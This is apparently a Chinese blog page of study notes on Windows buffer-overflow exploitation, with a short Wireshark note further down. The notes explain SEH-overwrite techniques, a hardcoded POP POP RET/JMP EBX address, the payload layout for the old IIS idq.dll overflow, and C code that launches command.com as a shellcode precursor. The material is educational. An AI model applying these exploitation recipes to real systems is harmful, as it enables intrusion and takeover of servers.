<p>其思路是：先利用JMP ESP的攻击程序在JMP ESP代码后跟上“\xeb\xfe”，这句 即JMP –1。实行模拟攻击后，在被攻击机上调出SoftICE，就会发现停在“\xeb\xfe”这句。这时，我们查 看其fs:0000的值，它里面存的就是异常处理的入口地址！这时，我们计算那个值离现在的距离，就能轻松知 道要填充多少才能达到异常处理入口了。</p>
</blockquote>
<blockquote>
<p>SoftICE<br>动态分析中最重要的是调试器，分为用户模式和内核模式两种类型。用户模式是指用来调试用户模式的应用程 序，它们工作在Ring 3级，如Visual C++等编译器自带的调试器。内核模式调试器指能调试操作系统内核的 调试器，它们处于CPU和操作系统之间，工作在Ring 0 级，如SoftICE。<strong>SoftICE 是Compuwar NuMega公司 的产品，是目前公认的最好的系统级调试工具！</strong>兼容性和稳定性极好，可在源代码级调试各种应用程序和设备 驱动程序，也可使用RCP/IP连接进行远程调试。</p>
</blockquote>
<p>softice没有单独版本，都是和numega的driverstudio一起发布的</p>
<p>Ctrl+D呼出</p>
<p>什么时候RET RET 04</p>
<blockquote>
<p>Windows下存在两种调用方式：C 式和Pascal式。第一种是C方式，这是C 和C++的缺省调用方式，函数修饰为<em>cdecl。它由主调用进行参数压栈并且恢复堆 栈，这样被调用函数就只用执行RET返回就行了。第二种是Pascal 方式，大多数Windows API 函数使用这种方式，函数修饰为WINAPI、 PASCAL、 CALLBACK或</em> stdcall。这种方式是由主调用负责压栈，而在被调用函数中恢复堆栈，返回就需要执行RET n了。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data</span><br><span class="line">dd FS:0 &#x2F;&#x2F;显示值 可以看到0038:00000000 00D8F428</span><br></pre></td></tr></table></figure>

<p>00D8F428就是这里的异常入口地址。如果出现异常错误，EBX就会变为0x00D8F428, 而系统会跳到 0x00D8F428+4 = 0x0172f42c中执行处理代码。把0x00D8F42C 覆盖成JMP EBX的地址，而把0x00D8F428覆盖成NOP NOP JMP 04 指令</p>
<p>计算——覆盖的返回点0x00D8F3D8，异常点在0x00D8F428，异常点比覆盖返回点多80个字节。</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590804022026.png" alt="1590804022026"></p>
<blockquote>
<p>小知识：SoftICE的常用指令<br>SoftICE指令比较多，功能也比较强。在调试和破解时，常用的指令有：<br>F10：单步执行，CALL, INT会被跳过；<br>F8：单步执行，CALL, INT会被切入；<br>Ctrl＋上下键或ALT＋上下键：在数据窗口或代码窗口中移动。在鼠标失灵时特别有用。<br>BPX：设置执行地址断点，格式为 BPX 地址 和 BPX 函数名 。这个函数名可以是任意一个Windows API函 数，是破解时的明星指令。<br>U：反汇编，格式为 U 地址 。可以看到该地址后的指令代码是什么，测试Exploit时经常用来查看ShellCode 的功能。<br>D：查看内存数据。经常用来对照比较ShellCode 是否被改变。<br>R：更改寄存器的值。格式为 R 寄存器名=值 ，当EIP 陷入死循环时，又不想重启机器，就用R 来改变EIP 的值，手动跳出死循环。</p>
</blockquote>
<p>总结：</p>
<p>JMP/CALL EBX 方式的利用格式是 NNNNNJESSSSSS 。这里，N=NOP，J=JMP 04，E =JMP EBX的地址， S=ShellCode。这样异常处理时，就会执行JMP EBX，而EBX 在 J的位置，那就可以跳过E， 进入ShellCode了。</p>
<p>JMP ESP CALL EBX都可以用，特定情况只能使用一种——如果程序还是有长度限制不能覆盖到异常处理点，但 可以覆盖到返回地址时，那就只能用JMP ESP覆盖EIP； CALL EBX当能覆盖异常处理点时（在返回前就有异常）。另外，在XP 下发生异常时，EBX不再指向下一处理链表，而改成了堆栈中的第三个值指向下一处理链表。所 以，要使用pop pop ret 在内存中的地址覆盖异常处理点，而通用地址就是0x7ffa1571。</p>
<p>IIS 的IDA/IDQ漏洞</p>
<blockquote>
<p>作为安装IIS过程的一部分，系统还会安装几个ISAPI扩展.dll，其中，idq.dll 是Index Server 的一个组 件，对管理员脚本和Internet数据查询提供支持。但是，idq.dll 在一段处理URL输入的代码中存在一个未 经检查的缓冲区，攻击者利用此漏洞能导致受影响的服务器产生缓冲区溢出，从而执行自己提供的代码。更为 严重的是，idq.dll是以System身份运行的，攻击者可以利用此漏洞取得系统管理员权限。该漏洞对Win2000 SP0、SP1、SP2有效。大家可以看到，采用 GET /NULL.ida?[bufer]=x HTTP /1.1 对 Buffeer（缓冲区）域进行填充，就可以覆盖到EIP，再继续也可以覆盖到异常处理点。</p>
</blockquote>
<p>三步：异常处理点位置（缓冲区）第240字节处，因此在236字节处放上NOP NOP jmp 04，在240字节处放上JMP EBX地址，在244字节处放上shellcode。shellcode添加用户。jmp ebx——0x7ffa1571</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590804829002.png" alt="1590804829002"></p>
<p>宽字符——双字节、多语言字符代码。unicode——在shellcode前面加上%u符号。</p>
<p>课堂解惑</p>
<p>1.无需知道ESP值。0x7FFA4512.JMP ESP指令（机器码为FF E4_VC中可以用“__asm{}”嵌入汇编JMP ESP，再按F10进入调试）的地址在同种系统甚至不同系统都是0x7FFA4512。</p>
<p>2.覆盖异常处理点时，我用的就是CALL EBX指令地址，失败——xp系统EBX会变成0，需要用POP POP RET指令地址来覆盖。个中文版ＮＴ/Win2000/Win2003都通用的地址——0x7FFA1571。</p>
<p>3.linux确切定位shellcode——把shellcode放在环境变量</p>
<p>第二章 windows下shellcode编写初步</p>
<p>ShellCode是一组能完成我们想要的功能的机器代码，通常以十六进制数组的形式存在。计算机能直接执行的机器代码，只要计算机的指令指针EIP指向shellcode里面，就可以顺利执行了。</p>
<blockquote>
<p>计算机每次都只是执行当前EIP指向的指令（单CPU）。在当前指令执行后，EIP 会自动加1，从而指向下一 条指令。如果有JMP CALL RET一类的指令，EIP就会被强行改变成指定的地址，从而完成流程的跳转。</p>
</blockquote>
<p>像在Debug时动态改变寄存器值一样</p>
<p>最好能开一个DOS窗口</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    LoadLibrary(“msvcrt.dll”);</span><br><span class="line">    system(“command.com”);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt; #include &lt;winbase.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR)</span></span>; <span class="comment">//定义函数指针</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    HINSTANCE LibHandle; </span><br><span class="line">    MYPROC ProcAdd; </span><br><span class="line">    LibHandle = LoadLibrary(“msvcrt.dll”); </span><br><span class="line">    ProcAdd = (MYPROC) GetProcAddress(LibHandle, <span class="string">"system"</span>); <span class="comment">//查找system函数地址 </span></span><br><span class="line">    (ProcAdd) (<span class="string">"command.com"</span>); <span class="comment">//其实就是执行system(“command.com”)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义函数指针，指向函数的参数是字符串，返回值是空。该指针的作用是指向system函数，然后在后面方便调用；</p>
<p>加载msvcrt.dll这个动态链接库，动态链接库的句柄赋给LibHandle。获得句柄后，我们再使用GetProcAddress获得system的真实地址，使用真实地址调用system函数。执行该语句后，ProcAdd为指向system函数的指针。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ytytytytyt6.github.io/ytytytytyt6.github.io/2020/05/28/%E2%80%9C%E6%BC%8F%E6%B4%9E%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E2%80%9D/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="万俟思睿">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/ytytytytyt6.github.io/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="思睿's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/ytytytytyt6.github.io/2020/05/28/%E2%80%9C%E6%BC%8F%E6%B4%9E%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E2%80%9D/" itemprop="url">“漏洞样本分析”</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-28T21:57:39+08:00">
                2020-05-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ytytytytyt6.github.io/ytytytytyt6.github.io/2020/02/04/wireshark%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="万俟思睿">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/ytytytytyt6.github.io/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="思睿's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/ytytytytyt6.github.io/2020/02/04/wireshark%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/" itemprop="url">wireshark学习实战 </a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-02-04T09:49:33+08:00">
                2020-02-04
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>学习链接：<br><a href="https://unit42.paloaltonetworks.com/unit42-customizing-wireshark-changing-column-display/" target="_blank" rel="noopener">https://unit42.paloaltonetworks.com/unit42-customizing-wireshark-changing-column-display/</a><br><a href="https://unit42.paloaltonetworks.com/using-wireshark-identifying-hosts-and-users/" target="_blank" rel="noopener">https://unit42.paloaltonetworks.com/using-wireshark-identifying-hosts-and-users/</a><br><a href="https://unit42.paloaltonetworks.com/using-wireshark-display-filter-expressions/" target="_blank" rel="noopener">https://unit42.paloaltonetworks.com/using-wireshark-display-filter-expressions/</a><br>以上系列文章作者是Palo Alto Networks 42部门的威胁情报分析师布拉德·邓肯，他经常使用Wireshark审查由恶意软件样本生成的流量。</p>
<h2 id="1-wireshark可以自定义列显示"><a href="#1-wireshark可以自定义列显示" class="headerlink" title="1.wireshark可以自定义列显示"></a><strong>1.wireshark可以自定义列显示</strong></h2><!-- Wireshark的默认列为：
No. -pcap开头的帧号。第一帧始终为1。
time --秒数从pcap的第一帧降低到纳秒。第一帧始终为0.000000。
Source --源地址，通常是IPv4，IPv6或以太网地址。
Destination --目标地址，通常是IPv4，IPv6或以太网地址。
Protocol --以太网帧，IP数据包或TCP段（ARP，DNS，TCP，HTTP等）中使用的协议。
Length --帧的长度（以字节为单位）。 -->
<p>流量分析通常需要使用UTC的日期和时间、源IP和源端口、目标IP和目标端口、HTTP主机、HTTPS服务器、信息。为了这个目的需要进行隐藏列、移除列、添加列、更改UTC时间、自定义列操作。<br>http.request或ssl.handshake.type == 1过滤会有更好的理解。</p>
<h2 id="2-使用Wireshark：识别主机和用户"><a href="#2-使用Wireshark：识别主机和用户" class="headerlink" title="2.使用Wireshark：识别主机和用户"></a><strong>2.使用Wireshark：识别主机和用户</strong></h2><h5 id="来自DHCP流量的主机信息"><a href="#来自DHCP流量的主机信息" class="headerlink" title="来自DHCP流量的主机信息"></a>来自DHCP流量的主机信息</h5><p>三个标识符：mac地址，<a href="https://en.wikipedia.org/wiki/IP_address" target="_blank" rel="noopener">IP地址</a>和<a href="https://en.wikipedia.org/wiki/Hostname" target="_blank" rel="noopener">主机名</a>。一般是通过ip地址寻找关联的mac地址和主机</p>
<p><a href="https://wiki.wireshark.org/DHCP" target="_blank" rel="noopener">DHCP</a>或<a href="https://wiki.wireshark.org/NetBIOS/NBNS" target="_blank" rel="noopener">NBNS</a>。DHCP流量可以帮助识别几乎所有连接到网络的计算机的主机。NBNS流量主要由运行Microsoft Windows的计算机或运行MacOS的Apple主机生成。</p>
<h5 id="来自NetBIOS名称服务（NBNS）流量的主机信息"><a href="#来自NetBIOS名称服务（NBNS）流量的主机信息" class="headerlink" title="来自NetBIOS名称服务（NBNS）流量的主机信息"></a>来自NetBIOS名称服务（NBNS）流量的主机信息</h5><h5 id="来自HTTP流量的设备模型和操作系统"><a href="#来自HTTP流量的设备模型和操作系统" class="headerlink" title="来自HTTP流量的设备模型和操作系统"></a>来自HTTP流量的设备模型和操作系统</h5><h5 id="Windows用户帐户来自Kerberos流量"><a href="#Windows用户帐户来自Kerberos流量" class="headerlink" title="Windows用户帐户来自Kerberos流量"></a>Windows用户帐户来自Kerberos流量</h5>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/ytytytytyt6.github.io/page/2/">&lt;i class&#x3D;&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/ytytytytyt6.github.io/">1</a><a class="page-number" href="/ytytytytyt6.github.io/page/2/">2</a><span class="page-number current">3</span>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">万俟思睿</p>
              <p class="site-description motion-element" itemprop="description">进一寸有一寸的欢喜</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/ytytytytyt6.github.io/archives">
              
                  <span class="site-state-item-count">29</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">tags</span>
                
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">万俟思睿</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/ytytytytyt6.github.io/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/ytytytytyt6.github.io/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/ytytytytyt6.github.io/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/ytytytytyt6.github.io/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/ytytytytyt6.github.io/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/ytytytytyt6.github.io/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/ytytytytyt6.github.io/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/ytytytytyt6.github.io/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/ytytytytyt6.github.io/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
